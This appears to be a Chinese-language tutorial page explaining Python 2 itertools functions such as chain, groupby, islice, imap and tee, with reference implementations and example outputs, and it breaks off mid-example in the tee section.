<p>使用代码如下:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">	</span><br><span class="line">from itertools import *</span><br><span class="line">   </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> repeat(<span class="string">'over-and-over'</span>, 5):</span><br><span class="line">    <span class="built_in">print</span> i</span><br><span class="line"> </span><br><span class="line">over-and-over</span><br><span class="line">over-and-over</span><br><span class="line">over-and-over</span><br><span class="line">over-and-over</span><br><span class="line">over-and-over</span><br></pre></td></tr></table></figure></p>
<h1 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h1><h2 id="itertools-chain-iterables"><a href="#itertools-chain-iterables" class="headerlink" title="itertools.chain(*iterables)"></a>itertools.chain(*iterables)</h2><p>将多个迭代器作为参数, 但只返回单个迭代器, 它产生所有参数迭代器的内容, 就好像他们是来自于一个单一的序列.<br>复制代码代码如下:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">def chain(*iterables):</span><br><span class="line">    <span class="comment"># chain('ABC', 'DEF') --&gt; A B C D E F</span></span><br><span class="line">    <span class="keyword">for</span> it <span class="keyword">in</span> iterables:</span><br><span class="line">        <span class="keyword">for</span> element <span class="keyword">in</span> it:</span><br><span class="line">            yield element</span><br><span class="line"></span><br><span class="line">```　　</span><br><span class="line">使用代码如下:</span><br><span class="line"></span><br><span class="line">```bash	</span><br><span class="line">from itertools import *</span><br><span class="line">  </span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> chain([1, 2, 3], [<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>]):</span><br><span class="line">    <span class="built_in">print</span> i</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">a</span><br><span class="line">b</span><br><span class="line">c</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">from itertools import chain, imap</span><br><span class="line">def flatmap(f, items):</span><br><span class="line">    <span class="built_in">return</span> chain.from_iterable(imap(f, items))</span><br><span class="line">&gt;&gt;&gt; list(flatmap(os.listdir, <span class="built_in">dirs</span>))</span><br><span class="line">&gt;&gt;&gt; [<span class="string">'settings.py'</span>, <span class="string">'wsgi.py'</span>, <span class="string">'templates'</span>, <span class="string">'app.py'</span>,</span><br><span class="line">     <span class="string">'templates'</span>, <span class="string">'index.html, '</span>config.json<span class="string">']</span></span><br></pre></td></tr></table></figure></p>
<h2 id="itertools-compress-data-selectors"><a href="#itertools-compress-data-selectors" class="headerlink" title="itertools.compress(data, selectors)"></a>itertools.compress(data, selectors)</h2><p>提供一个选择列表，对原始数据进行筛选代码如下:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def compress(data, selectors):</span><br><span class="line">    <span class="comment"># compress('ABCDEF', [1,0,1,0,1,1]) --&gt; A C E F</span></span><br><span class="line">    <span class="built_in">return</span> (d <span class="keyword">for</span> d, s <span class="keyword">in</span> izip(data, selectors) <span class="keyword">if</span> s)</span><br></pre></td></tr></table></figure>
<h2 id="itertools-dropwhile-predicate-iterable"><a href="#itertools-dropwhile-predicate-iterable" class="headerlink" title="itertools.dropwhile(predicate, iterable)"></a>itertools.dropwhile(predicate, iterable)</h2><p>创建一个迭代器，只要函数predicate(item)为True，就丢弃iterable中的项，如果predicate返回False，就会生成iterable中的项和所有后续项。</p>
<p>即：在条件为false之后的第一次, 返回迭代器中剩下来的项.代码如下:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">def dropwhile(predicate, iterable):</span><br><span class="line">    <span class="comment"># dropwhile(lambda x: x&lt;5, [1,4,6,4,1]) --&gt; 6 4 1</span></span><br><span class="line">    iterable = iter(iterable)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> iterable:</span><br><span class="line">        <span class="keyword">if</span> not predicate(x):</span><br><span class="line">            yield x</span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> iterable:</span><br><span class="line">        yield x</span><br></pre></td></tr></table></figure>
<p>使用代码如下:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from itertools import *</span><br><span class="line">   </span><br><span class="line">def should_drop(x):</span><br><span class="line">    <span class="built_in">print</span> <span class="string">'Testing:'</span>, x</span><br><span class="line">    <span class="built_in">return</span> (x&lt;1)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dropwhile(should_drop, [ -1, 0, 1, 2, 3, 4, 1, -2 ]):</span><br><span class="line">    <span class="built_in">print</span> <span class="string">'Yielding:'</span>, i</span><br><span class="line"> </span><br><span class="line">Testing: -1</span><br><span class="line">Testing: 0</span><br><span class="line">Testing: 1</span><br><span class="line">Yielding: 1</span><br><span class="line">Yielding: 2</span><br><span class="line">Yielding: 3</span><br><span class="line">Yielding: 4</span><br><span class="line">Yielding: 1</span><br><span class="line">Yielding: -2</span><br></pre></td></tr></table></figure></p>
<h2 id="itertools-groupby-iterable-key"><a href="#itertools-groupby-iterable-key" class="headerlink" title="itertools.groupby(iterable[, key])"></a>itertools.groupby(iterable[, key])</h2><p>返回一个产生按照key进行分组后的值集合的迭代器.</p>
<p>如果iterable在多次连续迭代中生成了同一项，则会定义一个组，如果将此函数应用一个分类列表，那么分组将定义该列表中的所有唯一项，key（如果已提供）是一个函数，应用于每一项，如果此函数存在返回值，该值将用于后续项而不是该项本身进行比较，此函数返回的迭代器生成元素(key, group)，其中key是分组的键值，group是迭代器，生成组成该组的所有项。</p>
<p>即：按照keyfunc函数对序列每个元素执行后的结果分组(每个分组是一个迭代器), 返回这些分组的迭代器<br>等价于代码如下:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">class groupby(object):</span><br><span class="line">    <span class="comment"># [k for k, g in groupby('AAAABBBCCDAABBB')] --&gt; A B C D A B</span></span><br><span class="line">    <span class="comment"># [list(g) for k, g in groupby('AAAABBBCCD')] --&gt; AAAA BBB CC D</span></span><br><span class="line">    def __init__(self, iterable, key=None):</span><br><span class="line">        <span class="keyword">if</span> key is None:</span><br><span class="line">            key = lambda x: x</span><br><span class="line">        self.keyfunc = key</span><br><span class="line">        self.it = iter(iterable)</span><br><span class="line">        self.tgtkey = self.currkey = self.currvalue = object()</span><br><span class="line">    def __iter__(self):</span><br><span class="line">        <span class="built_in">return</span> self</span><br><span class="line">    def next(self):</span><br><span class="line">        <span class="keyword">while</span> self.currkey == self.tgtkey:</span><br><span class="line">            self.currvalue = next(self.it)    <span class="comment"># Exit on StopIteration</span></span><br><span class="line">            self.currkey = self.keyfunc(self.currvalue)</span><br><span class="line">        self.tgtkey = self.currkey</span><br><span class="line">        <span class="built_in">return</span> (self.currkey, self._grouper(self.tgtkey))</span><br><span class="line">    def _grouper(self, tgtkey):</span><br><span class="line">        <span class="keyword">while</span> self.currkey == tgtkey:</span><br><span class="line">            yield self.currvalue</span><br><span class="line">            self.currvalue = next(self.it)    <span class="comment"># Exit on StopIteration</span></span><br><span class="line">            self.currkey = self.keyfunc(self.currvalue)</span><br></pre></td></tr></table></figure></p>
<p>应用代码如下:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from itertools import groupby</span><br><span class="line">qs = [&#123;<span class="string">'date'</span> : 1&#125;,&#123;<span class="string">'date'</span> : 2&#125;]</span><br><span class="line">[(name, list(group)) <span class="keyword">for</span> name, group <span class="keyword">in</span> itertools.groupby(qs, lambda p:p[<span class="string">'date'</span>])]</span><br><span class="line">  </span><br><span class="line"> </span><br><span class="line">Out[77]: [(1, [&#123;<span class="string">'date'</span>: 1&#125;]), (2, [&#123;<span class="string">'date'</span>: 2&#125;])]</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&gt;&gt;&gt; from itertools import *</span><br><span class="line">&gt;&gt;&gt; a = [<span class="string">'aa'</span>, <span class="string">'ab'</span>, <span class="string">'abc'</span>, <span class="string">'bcd'</span>, <span class="string">'abcde'</span>]</span><br><span class="line">&gt;&gt;&gt; <span class="keyword">for</span> i, k <span class="keyword">in</span> groupby(a, len):</span><br><span class="line">...     <span class="built_in">print</span> i, list(k)</span><br><span class="line">...</span><br><span class="line">2 [<span class="string">'aa'</span>, <span class="string">'ab'</span>]</span><br><span class="line">3 [<span class="string">'abc'</span>, <span class="string">'bcd'</span>]</span><br><span class="line">5 [<span class="string">'abcde'</span>]</span><br></pre></td></tr></table></figure></p>
<p>另一个例子代码如下:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from itertools import *</span><br><span class="line">from operator import itemgetter</span><br><span class="line">  </span><br><span class="line">d = dict(a=1, b=2, c=1, d=2, e=1, f=2, g=3)</span><br><span class="line">di = sorted(d.iteritems(), key=itemgetter(1))</span><br><span class="line"><span class="keyword">for</span> k, g <span class="keyword">in</span> groupby(di, key=itemgetter(1)):</span><br><span class="line">    <span class="built_in">print</span> k, map(itemgetter(0), g)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">1 [<span class="string">'a'</span>, <span class="string">'c'</span>, <span class="string">'e'</span>]</span><br><span class="line">2 [<span class="string">'b'</span>, <span class="string">'d'</span>, <span class="string">'f'</span>]</span><br><span class="line">3 [<span class="string">'g'</span>]</span><br></pre></td></tr></table></figure></p>
<h2 id="itertools-ifilter-predicate-iterable"><a href="#itertools-ifilter-predicate-iterable" class="headerlink" title="itertools.ifilter(predicate, iterable)"></a>itertools.ifilter(predicate, iterable)</h2><p>返回的是迭代器类似于针对列表的内置函数 filter() , 它只包括当测试函数返回true时的项. 它不同于 dropwhile()</p>
<p>创建一个迭代器，仅生成iterable中predicate(item)为True的项，如果predicate为None，将返回iterable中所有计算为True的项</p>
<p>对函数func执行返回真的元素的迭代器<br>复制代码代码如下:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def ifilter(predicate, iterable):</span><br><span class="line">    <span class="comment"># ifilter(lambda x: x%2, range(10)) --&gt; 1 3 5 7 9</span></span><br><span class="line">    <span class="keyword">if</span> predicate is None:</span><br><span class="line">        predicate = bool</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> iterable:</span><br><span class="line">        <span class="keyword">if</span> predicate(x):</span><br><span class="line">            yield x</span><br></pre></td></tr></table></figure></p>
<p>使用代码如下:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from itertools import *</span><br><span class="line">   </span><br><span class="line">def check_item(x):</span><br><span class="line">    <span class="built_in">print</span> <span class="string">'Testing:'</span>, x</span><br><span class="line">    <span class="built_in">return</span> (x&lt;1)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ifilter(check_item, [ -1, 0, 1, 2, 3, 4, 1, -2 ]):</span><br><span class="line">    <span class="built_in">print</span> <span class="string">'Yielding:'</span>, i</span><br><span class="line"> </span><br><span class="line">Testing: -1</span><br><span class="line">Yielding: -1</span><br><span class="line">Testing: 0</span><br><span class="line">Yielding: 0</span><br><span class="line">Testing: 1</span><br><span class="line">Testing: 2</span><br><span class="line">Testing: 3</span><br><span class="line">Testing: 4</span><br><span class="line">Testing: 1</span><br><span class="line">Testing: -2</span><br><span class="line">Yielding: -2</span><br></pre></td></tr></table></figure></p>
<h2 id="itertools-ifilterfalse-predicate-iterable"><a href="#itertools-ifilterfalse-predicate-iterable" class="headerlink" title="itertools.ifilterfalse(predicate, iterable)"></a>itertools.ifilterfalse(predicate, iterable)</h2><p>和ifilter(函数相反 ， 返回一个包含那些测试函数返回false的项的迭代器)</p>
<p>创建一个迭代器，仅生成iterable中predicate(item)为False的项，如果predicate为None，则返回iterable中所有计算为False的项 对函数func执行返回假的元素的迭代器<br>复制代码代码如下:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def ifilterfalse(predicate, iterable):</span><br><span class="line">    <span class="comment"># ifilterfalse(lambda x: x%2, range(10)) --&gt; 0 2 4 6 8</span></span><br><span class="line">    <span class="keyword">if</span> predicate is None:</span><br><span class="line">        predicate = bool</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> iterable:</span><br><span class="line">        <span class="keyword">if</span> not predicate(x):</span><br><span class="line">            yield x</span><br></pre></td></tr></table></figure></p>
<p>使用代码如下:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from itertools import *</span><br><span class="line">  </span><br><span class="line">def check_item(x):</span><br><span class="line">    <span class="built_in">print</span> <span class="string">'Testing:'</span>, x</span><br><span class="line">    <span class="built_in">return</span> (x&lt;1)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ifilterfalse(check_item, [ -1, 0, 1, 2, 3, 4, 1, -2 ]):</span><br><span class="line">    <span class="built_in">print</span> <span class="string">'Yielding:'</span>, i</span><br><span class="line"> </span><br><span class="line">Testing: -1</span><br><span class="line">Testing: 0</span><br><span class="line">Testing: 1</span><br><span class="line">Yielding: 1</span><br><span class="line">Testing: 2</span><br><span class="line">Yielding: 2</span><br><span class="line">Testing: 3</span><br><span class="line">Yielding: 3</span><br><span class="line">Testing: 4</span><br><span class="line">Yielding: 4</span><br><span class="line">Testing: 1</span><br><span class="line">Yielding: 1</span><br><span class="line">Testing: -2</span><br></pre></td></tr></table></figure></p>
<h2 id="itertools-islice-iterable-stop"><a href="#itertools-islice-iterable-stop" class="headerlink" title="itertools.islice(iterable, stop)"></a>itertools.islice(iterable, stop)</h2><h2 id="itertools-islice-iterable-start-stop-step"><a href="#itertools-islice-iterable-start-stop-step" class="headerlink" title="itertools.islice(iterable, start, stop[, step])"></a>itertools.islice(iterable, start, stop[, step])</h2><p>返回的迭代器是返回了输入迭代器根据索引来选取的项</p>
<p>创建一个迭代器，生成项的方式类似于切片返回值： iterable[start : stop : step]，将跳过前start个项，迭代在stop所指定的位置停止，step指定用于跳过项的步幅。 与切片不同，负值不会用于任何start，stop和step， 如果省略了start，迭代将从0开始，如果省略了step，步幅将采用1.</p>
<p>返回序列seq的从start开始到stop结束的步长为step的元素的迭代器代码如下:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">def islice(iterable, *args):</span><br><span class="line">    <span class="comment"># islice('ABCDEFG', 2) --&gt; A B</span></span><br><span class="line">    <span class="comment"># islice('ABCDEFG', 2, 4) --&gt; C D</span></span><br><span class="line">    <span class="comment"># islice('ABCDEFG', 2, None) --&gt; C D E F G</span></span><br><span class="line">    <span class="comment"># islice('ABCDEFG', 0, None, 2) --&gt; A C E G</span></span><br><span class="line">    s = slice(*args)</span><br><span class="line">    it = iter(xrange(s.start or 0, s.stop or sys.maxint, s.step or 1))</span><br><span class="line">    nexti = next(it)</span><br><span class="line">    <span class="keyword">for</span> i, element <span class="keyword">in</span> enumerate(iterable):</span><br><span class="line">        <span class="keyword">if</span> i == nexti:</span><br><span class="line">            yield element</span><br><span class="line">            nexti = next(it)</span><br></pre></td></tr></table></figure></p>
<p>使用代码如下:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">from itertools import *</span><br><span class="line">  </span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="string">'Stop at 5:'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> islice(count(), 5):</span><br><span class="line">    <span class="built_in">print</span> i</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="string">'Start at 5, Stop at 10:'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> islice(count(), 5, 10):</span><br><span class="line">    <span class="built_in">print</span> i</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="string">'By tens to 100:'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> islice(count(), 0, 100, 10):</span><br><span class="line">    <span class="built_in">print</span> i</span><br><span class="line"> </span><br><span class="line">Stop at 5:</span><br><span class="line">0</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">Start at 5, Stop at 10:</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">By tens to 100:</span><br><span class="line">0</span><br><span class="line">10</span><br><span class="line">20</span><br><span class="line">30</span><br><span class="line">40</span><br><span class="line">50</span><br><span class="line">60</span><br><span class="line">70</span><br><span class="line">80</span><br><span class="line">90</span><br></pre></td></tr></table></figure></p>
<h2 id="itertools-imap-function-iterables"><a href="#itertools-imap-function-iterables" class="headerlink" title="itertools.imap(function, *iterables)"></a>itertools.imap(function, *iterables)</h2><p>创建一个迭代器，生成项function(i1, i2, …, iN)，其中i1，i2…iN分别来自迭代器iter1，iter2 … iterN，如果function为None，则返回(i1, i2, …, iN)形式的元组，只要提供的一个迭代器不再生成值，迭代就会停止。</p>
<p>即：返回一个迭代器, 它是调用了一个其值在输入迭代器上的函数, 返回结果. 它类似于内置函数 map() , 只是前者在任意输入迭代器结束后就停止(而不是插入None值来补全所有的输入).</p>
<p>返回序列每个元素被func执行后返回值的序列的迭代器代码如下:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">def imap(<span class="keyword">function</span>, *iterables):</span><br><span class="line">    <span class="comment"># imap(pow, (2,3,10), (5,2,3)) --&gt; 32 9 1000</span></span><br><span class="line">    iterables = map(iter, iterables)</span><br><span class="line">    <span class="keyword">while</span> True:</span><br><span class="line">        args = [next(it) <span class="keyword">for</span> it <span class="keyword">in</span> iterables]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">function</span> is None:</span><br><span class="line">            yield tuple(args)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            yield <span class="keyword">function</span>(*args)</span><br></pre></td></tr></table></figure></p>
<p>使用代码如下:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from itertools import *</span><br><span class="line">   </span><br><span class="line"><span class="built_in">print</span> <span class="string">'Doubles:'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> imap(lambda x:2*x, xrange(5)):</span><br><span class="line">    <span class="built_in">print</span> i</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="string">'Multiples:'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> imap(lambda x,y:(x, y, x*y), xrange(5), xrange(5,10)):</span><br><span class="line">    <span class="built_in">print</span> <span class="string">'%d * %d = %d'</span> % i</span><br><span class="line"> </span><br><span class="line">Doubles:</span><br><span class="line">0</span><br><span class="line">2</span><br><span class="line">4</span><br><span class="line">6</span><br><span class="line">8</span><br><span class="line">Multiples:</span><br><span class="line">0 * 5 = 0</span><br><span class="line">1 * 6 = 6</span><br><span class="line">2 * 7 = 14</span><br><span class="line">3 * 8 = 24</span><br><span class="line">4 * 9 = 36</span><br></pre></td></tr></table></figure></p>
<h2 id="itertools-starmap-function-iterable"><a href="#itertools-starmap-function-iterable" class="headerlink" title="itertools.starmap(function, iterable)"></a>itertools.starmap(function, iterable)</h2><p>创建一个迭代器，生成值func(*item),其中item来自iterable，只有当iterable生成的项适用于这种调用函数的方式时，此函数才有效。</p>
<p>对序列seq的每个元素作为func的参数列表执行, 返回执行结果的迭代器<br>复制代码代码如下:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def starmap(<span class="keyword">function</span>, iterable):</span><br><span class="line">    <span class="comment"># starmap(pow, [(2,5), (3,2), (10,3)]) --&gt; 32 9 1000</span></span><br><span class="line">    <span class="keyword">for</span> args <span class="keyword">in</span> iterable:</span><br><span class="line">        yield <span class="keyword">function</span>(*args)</span><br></pre></td></tr></table></figure></p>
<p>使用代码如下:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from itertools import *</span><br><span class="line">   </span><br><span class="line">values = [(0, 5), (1, 6), (2, 7), (3, 8), (4, 9)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> starmap(lambda x,y:(x, y, x*y), values):</span><br><span class="line">    <span class="built_in">print</span> <span class="string">'%d * %d = %d'</span> % i</span><br><span class="line"> </span><br><span class="line">0 * 5 = 0</span><br><span class="line">1 * 6 = 6</span><br><span class="line">2 * 7 = 14</span><br><span class="line">3 * 8 = 24</span><br><span class="line">4 * 9 = 36</span><br></pre></td></tr></table></figure></p>
<h2 id="itertools-tee-iterable-n-2"><a href="#itertools-tee-iterable-n-2" class="headerlink" title="itertools.tee(iterable[, n=2])"></a>itertools.tee(iterable[, n=2])</h2><p>返回一些基于单个原始输入的独立迭代器(默认为2). 它和Unix上的tee工具有点语义相似, 也就是说它们都重复读取输入设备中的值并将值写入到一个命名文件和标准输出中</p>
<p>从iterable创建n个独立的迭代器，创建的迭代器以n元组的形式返回，n的默认值为2，此函数适用于任何可迭代的对象，但是，为了克隆原始迭代器，生成的项会被缓存，并在所有新创建的迭代器中使用，一定要注意，不要在调用tee()之后使用原始迭代器iterable，否则缓存机制可能无法正确工作。</p>
<p>把一个迭代器分为n个迭代器, 返回一个元组.默认是两个代码如下:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">def tee(iterable, n=2):</span><br><span class="line">    it = iter(iterable)</span><br><span class="line">    deques = [collections.deque() <span class="keyword">for</span> i <span class="keyword">in</span> range(n)]</span><br><span class="line">    def gen(mydeque):</span><br><span class="line">        <span class="keyword">while</span> True:</span><br><span class="line">            <span class="keyword">if</span> not mydeque:             <span class="comment"># when the local deque is empty</span></span><br><span class="line">                newval = next(it)       <span class="comment"># fetch a new value and</span></span><br><span class="line">                <span class="keyword">for</span> d <span class="keyword">in</span> deques:        <span class="comment"># load it to all the deques</span></span><br><span class="line">                    d.append(newval)</span><br><span class="line">            yield mydeque.popleft()</span><br><span class="line">    <span class="built_in">return</span> tuple(gen(d) <span class="keyword">for</span> d <span class="keyword">in</span> deques)</span><br></pre></td></tr></table></figure></p>
<p>使用代码如下:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from itertools import *</span><br><span class="line">   </span><br><span class="line">r = islice(count(), 5)</span><br><span class="line">i1, i2 = tee(r)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> i1:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">'i1:'</span>, i</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> i2:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">'i2:'</span>, i</span><br><span class="line"> </span><br><span class="line">i1: 0</span><br><span class="line">i1: 1</span><br><span class="line">i1: 2</span><br><span class="line">i1: 3</span><br><span class="line">i1: 4</span><br><span class="line">i2: 0</span><br><span class="line">i2: 1</span><br><span class="line">i2: 